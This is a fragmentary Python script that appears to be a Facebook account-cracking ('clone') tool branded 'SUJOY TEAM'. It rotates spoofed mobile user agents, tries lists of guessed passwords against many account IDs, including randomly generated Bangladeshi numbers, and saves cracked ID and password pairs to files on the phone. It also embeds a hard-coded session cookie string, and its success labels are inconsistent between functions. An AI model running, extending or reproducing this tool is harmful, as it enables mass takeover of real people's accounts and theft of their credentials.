...
syed =[
Mozilla/5.0 (Linux; Android 11; Infinix X6816 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]
Mozilla/5.0 (Linux; Android 12; Infinix X6827 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 GoogleApp/14.1.4.26.arm64
Mozilla/5.0 (Linux; Android 9; Infinix X5515F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/386.0.0.35.108;]
...
Mozilla/5.0 (Linux; Android 10; RMX1807 Build/QKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]
...
Mozilla/5.0 (Linux; Android 6.0; itel-it1512) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 11; SM-M022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]
logo=("""\033[1;97m
███████ ██    ██      ██  ██████  ██    ██ 
██      ██    ██      ██ ██    ██  ██  ██  
███████ ██    ██      ██ ██    ██   ████   
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> SUJOY TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			print('[1] Crack File Clone\n[2] Crack BD Random Clone\n[0] Exit')
			linex()
			xd=input('[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SUJOY.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Sujoy /Sarker] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[Sujoy-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/Sujoy-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Sujoy-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Sujoy -OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[SUJOY/SARKER] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[Sujoy -OK] %s | %s'%(ids,pas)
				open('/sdcard/Sujoy-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Sujoy-CP] '+ids+' | '+pas+'\033[1;97m')
...
def random_number1():
	...
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE :88019,88017,88018,88016.ETC')
	linex()
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mSujoy / Sarker\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
...
datr=eVXRY1l6PSjkpvpKhTK_S82h; m_pixel_ratio=1.943750023841858; wd=371x703; sb=lVbRYyHY1mDyKD_7ULvlpFjw; dnonce=AWlpoxx3caPqkBbeGY1ALLmpRMk1aYh99cJifl6EYGQHRs7_oPNBersAVrgwiVZkM2-wy6kQEHQNM3WPjyVaeGRd; fr=0UWvByHp7DVYMuo2i..Bj0VV5.XU.AAA.0.0.Bj0VaX.AWXwDO-63Rs
sec-ch-ua: 
...
Mozilla/5.0 (Linux; U; Android 11; en-us; Infinix X688B Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36 PHX/11.7
upgrade-insecure-requests: 
sec-fetch-user: ?1
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Sujoy-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Sujoy-OK] '+cid+' | '+ps+'\33[0;97m')
